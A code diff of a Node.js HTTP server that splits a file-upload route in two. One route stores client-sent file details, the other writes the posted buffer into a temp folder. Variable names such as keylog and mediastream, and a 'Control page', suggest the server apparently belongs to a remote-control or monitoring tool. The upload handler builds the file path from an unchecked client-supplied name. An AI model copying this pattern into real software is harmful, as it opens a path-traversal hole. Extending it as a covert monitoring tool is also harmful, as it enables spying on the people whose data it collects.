@@ -10,6 +10,7 @@ let keylog = [];
 let folders = { files: [], current_dir: [] };
 let mediastream
 let dirman_instruction = undefined;
+let tempdetails = {}
 
 //404 page goes here
 function notfoundpage(res, url) {
@@ -100,18 +101,32 @@ const server = http.createServer(function (req, res) {
 
             break;
 
-        case '/action/post/file'://receive folder instructions from Control page
+        case '/action/post/file/buffer'://receive folder instructions from Control page
 
             req.on('data', function (data) {
                 //console.log('file buffer posted', data);
-                var file = JSON.parse(data);
-                console.log('File data :', file)
+                /*var file = JSON.parse(data);*/
+                console.log('File data :', data)
 
-                fs.writeFile('temp/' + file.details.base, file.data.data, function (err) {//write posted file
-                    if (err) {
-                        console.warn('file error: ', err)
-                    }
-                })
+                try {
+                    if (!fs.existsSync('temp/')) { fs.mkdirSync('temp/') }
+                    fs.writeFile('temp/' + tempdetails.base, data, function (err) {//write posted file 
+                        if (err) { console.warn('file error: ', err) }
+                    })
+                } catch (err) {
+                    console.error(err)
+                }
+
+                res.end();
+            });
+
+            break;
+
+        case '/action/post/file/data'://receive file data instructions before file buffer is posted
+
+            req.on('data', function (data) {
+                //console.log('file buffer posted', data);
+                tempdetails = JSON.parse(data);
 
                 res.end();
             });
